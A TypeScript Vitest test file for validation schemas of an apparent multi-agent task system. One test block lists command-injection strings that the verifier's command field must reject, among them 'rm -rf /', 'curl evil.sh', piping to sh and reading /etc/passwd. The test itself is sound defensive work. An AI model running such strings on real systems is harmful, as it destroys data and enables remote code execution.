import { describe, it, expect } from 'vitest';
import {
  AgentRoleSchema,
  AgentStatusSchema,
  CircuitStateSchema,
  TaskStatusSchema,
  TaskModeSchema,
  MessagePrioritySchema,
  MessageTypeSchema,
  CreateTaskInput,
  CreateDiscussionInput,
} from './validation.js';

describe('열거형 스키마', () => {
  // 이 값들은 DB 컬럼·이벤트 타입·API 응답에 그대로 실린다. 조용히 늘거나 줄면
  // 기존 행과 대조가 깨지므로 목록을 통째로 고정한다.
  it.each([
    [AgentRoleSchema, 'Commander', 'commander'],
    [AgentStatusSchema, 'idle', 'Idle'],
    [CircuitStateSchema, 'half-open', 'halfopen'],
    [TaskStatusSchema, 'streaming', 'done'],
    [TaskModeSchema, 'consensus', 'debate'],
    [MessagePrioritySchema, 'critical', 'urgent'],
    [MessageTypeSchema, 'broadcast', 'multicast'],
  ] as const)('허용값은 통과하고 오탈자는 거부한다', (schema, ok, bad) => {
    expect(schema.safeParse(ok).success).toBe(true);
    expect(schema.safeParse(bad).success).toBe(false);
  });

  it('대소문자를 구분한다', () => {
    expect(TaskStatusSchema.safeParse('COMPLETED').success).toBe(false);
  });
});

describe('CreateTaskInput', () => {
  it('prompt 만 있으면 기본값이 채워진다', () => {
    const parsed = CreateTaskInput.parse({ prompt: '안녕' });
    expect(parsed).toMatchObject({ mode: 'task', workspaceId: 'default', priority: 0 });
  });

  it('빈 prompt 는 거부한다', () => {
    expect(CreateTaskInput.safeParse({ prompt: '' }).success).toBe(false);
  });

  describe('ai 는 형식만 본다 — 목록 대조는 런타임 레지스트리 몫', () => {
    // 2026-07-08 회귀: 정적 enum 이라 신규 프로바이더가 영구 400 으로 막혔다.
    // 그래서 여기서는 **모르는 id 도 형식만 맞으면 통과**해야 한다.
    it('처음 보는 프로바이더 id 도 통과한다', () => {
      expect(CreateTaskInput.safeParse({ prompt: 'x', ai: 'brand-new-provider' }).success).toBe(true);
    });

    it.each(['UPPER', '-leading', 'has_underscore', 'has.dot', '', 'a'.repeat(41)])(
      '형식 위반은 거부한다: %s',
      (ai) => {
        expect(CreateTaskInput.safeParse({ prompt: 'x', ai }).success).toBe(false);
      },
    );

    it('숫자 시작·하이픈 포함·40자는 허용한다', () => {
      for (const ai of ['4o-mini', 'a', 'a'.repeat(40)]) {
        expect(CreateTaskInput.safeParse({ prompt: 'x', ai }).success).toBe(true);
      }
    });
  });

  describe('verifier.command 셸 메타문자 차단', () => {
    // 이 명령은 검증 단계에서 실행된다. 셸 메타문자가 통과하면 임의 명령 실행이 된다.
    it('평범한 바이너리 호출은 통과한다', () => {
      const ok = CreateTaskInput.safeParse({
        prompt: 'x',
        verifier: { type: 'run', command: 'npm run build' },
      });
      expect(ok.success).toBe(true);
    });

    it.each([
      'npm test; rm -rf /',
      'npm test && curl evil.sh',
      'npm test | sh',
      'echo $(whoami)',
      'echo `id`',
      'sh -c "x"',
      "sh -c 'x'",
      'npm test > /tmp/out',
      'npm test < /etc/passwd',
      'npm test\nrm -rf /',
      'npm test & sleep 1',
      'echo ${HOME}',
      'echo \\;',
    ])('메타문자를 거부한다: %s', (command) => {
      const parsed = CreateTaskInput.safeParse({ prompt: 'x', verifier: { type: 'run', command } });
      expect(parsed.success).toBe(false);
    });

    it('빈 command 는 거부한다', () => {
      expect(CreateTaskInput.safeParse({
        prompt: 'x',
        verifier: { type: 'run', command: '' },
      }).success).toBe(false);
    });

    it('type 은 run 만 허용한다', () => {
      expect(CreateTaskInput.safeParse({
        prompt: 'x',
        verifier: { type: 'exec', command: 'ls' },
      }).success).toBe(false);
    });

    it('timeoutMs 범위를 강제한다 (1초~5분)', () => {
      const at = (timeoutMs: number) => CreateTaskInput.safeParse({
        prompt: 'x',
        verifier: { type: 'run', command: 'ls', timeoutMs },
      }).success;
      expect(at(999)).toBe(false);
      expect(at(1_000)).toBe(true);
      expect(at(300_000)).toBe(true);
      expect(at(300_001)).toBe(false);
    });
  });

  describe('경계값', () => {
    it('priority 는 0~10 정수', () => {
      const at = (priority: number) => CreateTaskInput.safeParse({ prompt: 'x', priority }).success;
      expect(at(-1)).toBe(false);
      expect(at(0)).toBe(true);
      expect(at(10)).toBe(true);
      expect(at(11)).toBe(false);
      expect(at(1.5)).toBe(false);
    });

    it('timeout 은 1초~30분', () => {
      const at = (timeout: number) => CreateTaskInput.safeParse({ prompt: 'x', timeout }).success;
      expect(at(999)).toBe(false);
      expect(at(1_000)).toBe(true);
      expect(at(1_800_000)).toBe(true);
      expect(at(1_800_001)).toBe(false);
    });

    it('requiredEvidence 의 빈 문자열은 거부한다', () => {
      expect(CreateTaskInput.safeParse({ prompt: 'x', requiredEvidence: ['a'] }).success).toBe(true);
      expect(CreateTaskInput.safeParse({ prompt: 'x', requiredEvidence: [''] }).success).toBe(false);
    });
  });
});

describe('CreateDiscussionInput', () => {
  it('기본값 — discussion · 3라운드 · 임계 0.8', () => {
    expect(CreateDiscussionInput.parse({ prompt: 'x' })).toMatchObject({
      mode: 'discussion',
      maxRounds: 3,
      consensusThreshold: 0.8,
      workspaceId: 'default',
    });
  });

  it('providers 를 줄 거면 2명 이상이어야 한다', () => {
    expect(CreateDiscussionInput.safeParse({ prompt: 'x', providers: ['a'] }).success).toBe(false);
    expect(CreateDiscussionInput.safeParse({ prompt: 'x', providers: ['a', 'b'] }).success).toBe(true);
  });

  it('providers 를 아예 안 주는 것은 허용한다 — 자동 선정 경로', () => {
    expect(CreateDiscussionInput.safeParse({ prompt: 'x' }).success).toBe(true);
  });

  it('maxRounds 는 1~10 정수', () => {
    const at = (maxRounds: number) => CreateDiscussionInput.safeParse({ prompt: 'x', maxRounds }).success;
    expect(at(0)).toBe(false);
    expect(at(1)).toBe(true);   // 평가 라운드 없는 fast path — 스키마는 허용한다
    expect(at(10)).toBe(true);
    expect(at(11)).toBe(false);
  });

  it('consensusThreshold 는 0~1', () => {
    const at = (v: number) => CreateDiscussionInput.safeParse({ prompt: 'x', consensusThreshold: v }).success;
    expect(at(-0.1)).toBe(false);
    expect(at(0)).toBe(true);
    expect(at(1)).toBe(true);
    expect(at(1.1)).toBe(false);
  });

  it('projectDir 은 공백만 있으면 거부한다', () => {
    expect(CreateDiscussionInput.safeParse({ prompt: 'x', projectDir: '   ' }).success).toBe(false);
    expect(CreateDiscussionInput.safeParse({ prompt: 'x', projectDir: ' /tmp ' }).success).toBe(true);
  });

  it('task 모드는 토론 스키마에서 거부한다', () => {
    expect(CreateDiscussionInput.safeParse({ prompt: 'x', mode: 'task' }).success).toBe(false);
  });
});
